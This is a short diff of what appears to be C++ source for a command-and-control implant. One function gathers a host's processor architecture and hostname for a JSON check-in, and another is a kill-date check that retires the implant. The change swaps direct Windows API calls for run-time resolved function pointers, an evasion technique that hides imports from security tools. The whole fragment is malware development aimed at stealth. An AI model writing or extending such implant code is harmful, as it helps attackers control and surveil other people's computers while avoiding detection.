@@ -45,19 +45,19 @@ namespace Handler
 
         // Get architecture
         SYSTEM_INFO systemInfo;
-        GetSystemInfo(&systemInfo);
+        pState->pProcs->lpGetSystemInfo(&systemInfo);
         wArch = System::Arch::ArchGetName(systemInfo.wProcessorArchitecture);
 
         // Get hostname and convert it to wstring
         WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
+        if (pState->pProcs->lpWSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
         {
             char szHostname[256] = "";
             gethostname(szHostname, 256);
             std::string sHostname(szHostname);
             wHostname = Utils::Convert::UTF8Decode(sHostname);
 
-            WSACleanup();
+            pState->pProcs->lpWSACleanup();
         }
 
         std::wstring wJson = L"{";
@@ -580,20 +580,20 @@ namespace Handler
     //     return TRUE;
     // }
 
-    BOOL IsKillDateReached(INT nKillDate)
+    BOOL IsKillDateReached(State::PSTATE pState)
     {
         SYSTEMTIME currentTime;
-        GetSystemTime(&currentTime);
+        pState->pProcs->lpGetSystemTime(&currentTime);
 
         // Convert the current time to timestamp.
         FILETIME currentFileTime;
-        SystemTimeToFileTime(&currentTime, &currentFileTime);
+        pState->pProcs->lpSystemTimeToFileTime(&currentTime, &currentFileTime);
         ULARGE_INTEGER currentTimestamp;
         currentTimestamp.LowPart = currentFileTime.dwLowDateTime;
         currentTimestamp.HighPart = currentFileTime.dwHighDateTime;
         INT currentTimestampSeconds = currentTimestamp.QuadPart / 10000000 - 11644473600;
 
-        if (currentTimestampSeconds >= nKillDate)
+        if (currentTimestampSeconds >= pState->nKillDate)
         {
             return TRUE;
         }
